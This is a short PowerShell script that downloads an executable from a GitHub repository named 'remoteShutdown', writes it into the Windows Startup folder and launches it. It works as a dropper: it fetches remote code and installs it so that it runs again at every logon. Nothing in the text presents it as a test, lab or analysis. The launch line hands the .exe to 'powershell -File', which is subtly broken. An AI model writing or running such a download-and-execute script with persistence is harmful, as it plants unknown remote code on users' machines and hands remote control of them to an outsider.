
$url = "https://github.com/Zippy-boy/remoteShutdown/raw/main/web.exe"
$output = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\web.exe"

Invoke-WebRequest -Uri $url -OutFile $output
Start-Process powershell.exe -ArgumentList "-File $output"
